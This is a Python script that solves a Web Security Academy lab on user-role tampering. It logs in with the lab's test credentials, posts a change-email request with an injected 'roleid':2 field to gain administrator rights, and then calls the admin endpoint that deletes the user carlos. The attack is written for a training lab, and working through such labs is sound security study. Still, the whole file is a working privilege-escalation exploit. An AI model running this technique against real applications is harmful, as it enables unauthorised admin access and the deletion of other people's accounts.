import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: User role can be modified in user profile')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# AUTH AS WIENER
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
headers = {"Cookie":f"session={r.cookies.get('session')}"}
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')
headers = {"Cookie":f"session={wiener}"}

# GET ADMIN PRIVILEGES
requests.post("https://" + lab.id + ".web-security-academy.net/my-account/change-email", headers=headers, data='{"email":"email@email.com", "roleid":2}', allow_redirects=False)

#DELETE CARLOS
requests.get("https://" + lab.id + ".web-security-academy.net/admin/delete?username=carlos", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")